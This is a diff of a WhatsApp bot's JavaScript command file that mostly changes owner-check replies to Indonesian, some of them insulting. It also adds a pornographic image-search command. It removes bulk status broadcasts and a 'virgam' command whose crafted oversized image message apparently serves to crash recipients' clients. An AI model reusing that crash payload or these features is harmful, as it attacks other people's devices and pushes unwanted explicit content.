@@ -6388,19 +6313,19 @@ haikal.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip
 break
 //=================================================//
 case 'sendzip': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
 let teks = `${text}`
 {
 haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
-m.reply(`SUCCESSFULLY SENT  Zip Ke ${m.quoted.sender}`)
+m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
 }
 }
 break
 //=================================================//
 case 'addapk':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Nama apk apa')
 let teks = `${text}`
@@ -6417,7 +6342,7 @@ reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
 break
 //=================================================//
 case 'delapk':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Masukan text yang ada di listapk')
 let teks = `${text}`
@@ -6433,19 +6358,19 @@ reply(`Sukses delete Apk ${teks}`)
 break
 //=================================================//
 case 'listapk': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
 for (let x of apknye) {
 teksoooooo = `│⭔ ${x}\n`
 }
-teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk DUX BOT + sambil reply pesan target* \n\n Contoh 2 : yoapk DUX BOT`
+teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk DUX BOT MODS WA + sambil reply pesan target* \n\n Contoh 2 : yoapk DUX BOT MODS WA`
 m.reply(teksoooooo)
 }
 break
 //=================================================//
 case 'yoapk':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Masukan text yang ada di listapk')
 let teks = `${text}`
@@ -6456,19 +6381,19 @@ haikal.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk
 break
 //=================================================//
 case 'sendapk': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
 let teks = `${text}`
 {
 haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
-m.reply(`SUCCESSFULLY SENT  Apk Ke ${m.quoted.sender}`)
+m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
 }
 }
 break
 //=================================================//
 case 'addvn':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Nama audionya apa')
 if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
@@ -6482,7 +6407,7 @@ reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
 break
 //=================================================//
 case 'delvn':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Masukan query')
 if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
@@ -6495,7 +6420,7 @@ reply(`Sukses delete vn ${text}`)
 break
 //=================================================//
 case 'listvn':{
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
 for (let x of vnnye) {
@@ -6506,7 +6431,7 @@ reply(teksooo)
 break
 //=================================================//
 case 'addmsg': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
  if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
  if (!text) throw `Example : ${prefix + command} nama file`
@@ -6522,18 +6447,18 @@ Lihat list Pesan Dengan ${prefix}listmsg`)
 break
 //=================================================//
 case 'sendlist': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
  if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
  let msgs = global.db.data.database
  if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
  haikal.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
- m.reply(`SUCCESSFULLY SENT  ${m.quoted.sender}`)
+ m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
 }
 break
 //=================================================//
 case 'listmsg': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  let msgs = global.db.data.database
 let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
@@ -6546,7 +6471,7 @@ m.reply(teks)
 break
 //=================================================//
 case 'delmsg': case 'deletemsg': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
@@ -6556,7 +6481,7 @@ m.reply(`Berhasil menghapus '${text}' dari list pesan`)
 break
 //=================================================//
 case 'getmsg': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
  let msgs = global.db.data.database
@@ -6576,6 +6501,20 @@ teks += `⭔ *Description* : ${g.snippet}\n`
 teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
 } 
 m.reply(teks)
+})
+}
+break
+//=================================================//
+case 'bokep': {
+ if (!text) throw `Example : ${prefix + command} indo`
+let gis = require('g-i-s')
+gis(text, async (error, result) => {
+n = result
+images = n[Math.floor(Math.random() * n.length)].url
+haikal.sendMessage(from, {image: { url: images },
+caption: `*-------「 GIMAGE SEARCH 」-------*
+🤠 *Query* : ${text}
+🔗 *Media Url* : ${images}`},{quoted:m})
 })
 }
 break
@@ -6608,7 +6547,7 @@ caption: `☕ Random Coffe`},{quoted:m})
 break
 //=================================================//
 case 'getname': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 if (qtod === "true") {
 namenye = await haikal.getName(m.quoted.sender)
@@ -6620,7 +6559,7 @@ haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
 break
 //=================================================//
 case 'getpic': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 if (qtod === "true") {
 try {
@@ -6641,31 +6580,31 @@ haikal.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m
 break
 //=================================================//
 case 'setppbot': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 m.reply('*Sabar Cuy Loading*')
 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
-var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
+var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
 }
 break
 //=================================================//
 case 'setppgroup': case 'setppgrup': case 'setppgc': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply('*special Owner Bot*')
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
 m.reply('*Sabar Cuy Loading*')
 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
-const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
+const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
 }
 break
 //=================================================//
 case 'block': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
@@ -6673,7 +6612,7 @@ await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(
 break
 //=================================================//
 case 'unblock': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
@@ -6681,7 +6620,7 @@ await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonforma
 break
 //=================================================//
 case 'stalktiktok':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
 axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
@@ -6697,7 +6636,7 @@ haikal.sendMessage(from, { image: { url: data.result.user_picture }, caption })
 break
 //=================================================//
 case 'listpanel': case 'panel':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
  var resio = await Quotes()
 teks = `\nAuthor: ${resio.author}\n`
 teks = `\nQuotes:\n`
@@ -6706,8 +6645,8 @@ let foottgkzooi = `Runtime : ⏳ ${runtime(process.uptime())}
 Jam : ${time}`
 sendGeekzMessage(from, { 
 text: `Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 *Kata - Kata Untuk Hari Ini*
 
@@ -6797,7 +6736,7 @@ reply(txtayajas)
 break
 //=================================================
 case 'cerpen':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
 var textpp = `Title : ${data.result.title}\n`
 textpp += `Creator : ${data.result.creator}\n`
@@ -6806,7 +6745,7 @@ reply(textpp)
 break
 //=================================================
 case 'ceritahoror':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
 var caption = `Title : ${data.result.title}\n`
 caption += `Desc : ${data.result.desc}\n`
@@ -6815,7 +6754,7 @@ haikal.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
 break
 //=================================================
 case 'cuaca':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
 var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
 var textppp = `Tempat : ${data.result.tempat}\n`
@@ -6830,463 +6769,9 @@ haikal.sendMessage(from, { location: { degreesLatitude: data.result.latitude, de
 reply(textppp)
 break
 //=================================================
-case 'afk': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-let user = global.db.data.users[m.sender]
-user.afkTime = + new Date
-user.afkReason = text
-m.reply(`${pushname}... Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`)
-}
-break
-//=================================================
-case 'buatsw':{
-if (!isCreator) return m.reply('*Special Premium*')
-let men = [];
-for (let x of Users) {
-men.push(x)
-const result = [ x ]
-if (!m.quoted && !text) throw 'reply pesan'
-if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = haikal.sendMessage('status@broadcast', {
-text: m.quoted.text,
-}, {
-backgroundColor: '#FF000000',
-font: 3,
-statusJidList: result
-});
-if (!m.quoted && text) _m = haikal.sendMessage('status@broadcast', {
-text,
-}, {
-backgroundColor: '#FF000000',
-font: 3,
-statusJidList: result
-});
-}
-await loading ()
-}
-m.reply(`*Sukses mengirim status whatsapp ke ${Users.length} Orang Yang Ada Di database*`)
-break
-//=================================================
-case 'virgam': {
-if (!isCreator) return m.reply('*Special Premium*')
-await loading()
-var document = generateWAMessageFromContent(from, proto.Message.fromObject({
-	"imageMessage": {
-	"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m232/up-oil-image-b78d6ac8-7f22-41e9-982b-671521789ec1?ccb=9-4&oh=01_AdTbHXT85p8gfE104asrKWx3rZGkWuILwvlP4fehYEHLiw&oe=64E6E572&mms3=true",
-	"mimetype": "image/jpeg",	
-	"fileSha256": "TwxGIa1qFIDW39pvaGPl99aFqWf9xrJFMcDT16vT7U4=",
-	"fileLength": "9565843",
-	"height": 39993,
-	"width": 1080,
-	"mediaKey": "nnJ5XWdm409Z5qVLxUJUuVRUAUuNF44Gx5bsiCkrFEY=",
-	"fileEncSha256": "OTCC5XCCa8rZMTD/ou8Q86dB3Vglqpx5bN0M8hCksCw=",
-	"directPath": "/o1/v/t62.7118-24/f1/m232/up-oil-image-b78d6ac8-7f22-41e9-982b-671521789ec1?ccb=9-4&oh=01_AdTbHXT85p8gfE104asrKWx3rZGkWuILwvlP4fehYEHLiw&oe=64E6E572",
-	"mediaKeyTimestamp": "1690265380",
-	"jpegThumbnail": virgam,
-	"scansSidecar": "/ZCEGb8p+SVtjE0eAKtM9SZyjz9cm9Utxmy/Zuvb8BbbG1V76XsTFA==",
-	"scanLengths": [
-687102,
-6152788,
-1292833,
-1433120
-	],
-	"midQualityFileSha256": "R1EivePk56jyqH4iEQOfNOrKCiEfQCO9JYqtCwAdX4o="
-}
-
-}), { userJid: from, quoted:m})
-haikal.relayMessage(from, document.message, { messageId: document.key.id })
-}
-await sleep(2000)
-break
-//=================================================
-case "buatswimage":{
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
- if (!quoted) throw `Balas image Dengan Caption ${prefix + command}`
-if (!/image/.test(mime)) throw `Balas image dengan caption *${prefix + command}*`
-const media = await haikal.downloadAndSaveMediaMessage(quoted)
-haikal.sendMessage('status@broadcast', { image: { url: media }}, {statusJidList: Users})
-}
-m.reply(`*Sukses mengirim status whatsapp ke ${Users.length} Orang Yang Ada Di database*`)
-break
-//=================================================
-case "buatswvideo":{
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
- if (!quoted) throw `Balas video Dengan Caption ${prefix + command}`
-if (!/video/.test(mime)) throw `Balas video dengan caption *${prefix + command}*`
-const media = await haikal.downloadAndSaveMediaMessage(quoted)
-haikal.sendMessage('status@broadcast', { video: { url: media }}, {statusJidList: Users})
-}
-m.reply(`*Sukses mengirim status whatsapp ke ${Users.length} Orang Yang Ada Di database*`)
-break
-//=================================================
-case 'swin':{
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
-if (!text) return m.reply(`masukin text nya`)
-haikal.sendMessage('status@broadcast', {
-text: `${text}`
-}, {
-backgroundColor: '#FF000000',
-font: 3,
-statusJidList: Users
-});
-}
-m.reply(`*Sukses mengirim status whatsapp ke ${Users.length} Orang Yang Ada Di database*`)
-break
-case 'vnsw':{
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
-if (!text) return m.reply(`masukin text nya yang ada di database listvn`)
-var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
-haikal.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
-backgroundColor: '#FF000000',
-statusJidList: Users
-});
-}
-m.reply(`*Sukses mengirim status whatsapp ke ${Users.length} Orang Yang Ada Di database*`)
-break
-//=================================================
-case 'inisw':{
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
-if (!text) return m.reply(`masukin text nya yang ada di database listvn`)
-var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
-haikal.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
-mediaType:  1,
-mediaUrl: 'https://wa.me/2347082252014',
-title: `DUX BOT`,
-sourceUrl: `https://wa.me/2347082252014`, 
-thumbnail: thumb}}},{
-backgroundColor: '#FF000000',
-statusJidList: Users
-});
-}
-m.reply(`*Sukses mengirim status whatsapp ke ${Users.length} Orang Yang Ada Di database*`)
-break
-//=================================================
-case 'hapusdb':
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
-if (!args[0]) return m.reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014@s.whatsapp.net`)
-yakiii = text.split("|")[0].replace(/[^0-9]/g, '')
-unnnp = Users.indexOf(yakiii)
-Users.splice(unnnp, 1)
-fs.writeFileSync('./database/user.json', JSON.stringify(Users, null, 2))
-m.reply(`Nomor ${yakiii} Telah Di Hapus Dari Database!!!`)
-break
-//=================================================//
-case 'listdb':
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
-if (isBan) return m.reply('*BANNED BY OWNER*')
- teksoooo = '*List Database*\n\n'
-for (let i of Users) {
-teksoooo += `- ${i}\n`
-}
-teksoooo += `\n*Total : ${Users.length}*`
-haikal.sendMessage(from, { text: teksoooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": Users } })
-break
-//=================================================
-case "buatswptv":
-{
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
- if (!m.quoted) throw `Balas Video Dengan Caption ${prefix + command}`
-var ppt = m.quoted
-var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
-	"ptvMessage": ppt
-}), { userJid: from, quoted:m})
-haikal.relayMessage('status@broadcast', ptv.message, {
-statusJidList: Users
-})
-}
-m.reply(`*Sukses mengirim status whatsapp ke ${Users.length} Orang Yang Ada Di database*`)
-break
-//=================================================
-case 'toptv':
-{
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
- if (!m.quoted) throw `Balas Video Dengan Caption ${prefix + command}`
-  if (/video/.test(mime)) {
-var ppt = m.quoted
-var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
-	"ptvMessage": ppt
-}), { userJid: from, quoted:m})
-haikal.relayMessage(from, ptv.message, { messageId: ptv.key.id })
-}
-}
-break
-//=================================================
-case "buatsws":{
-if (!isCreator) return m.reply('*Special Premium*')
-await loading ()
- if (!quoted) throw `Balas Sticker Dengan Caption ${prefix + command}`
-if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
-const media = await haikal.downloadAndSaveMediaMessage(quoted)
-haikal.sendMessage('status@broadcast', { sticker: { url: media }}, {statusJidList: Users})
-}
-m.reply(`*Sukses mengirim status whatsapp ke ${Users.length} Orang Yang Ada Di database*`)
-break
-//=================================================
-case 'family100': {
- if ('family100'+from in _family100) {
- m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
- throw false
- }
- let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
- let random = anu[Math.floor(Math.random() * anu.length)]
- let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
- _family100['family100'+from] = {
- id: 'family100'+from,
- pesan: await haikal.sendText(from, hasil, m),
- ...random,
- terjawab: Array.from(random.jawaban, () => false),
- hadiah: 6,
- }
-}
-break
-//=================================================//
-case 'tebak': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
- if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
- if (args[0] === "lagu") {
- if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
- let anu = await JSON.parse(fs.readFileSync('./database/Games/tebaklagu.json'));
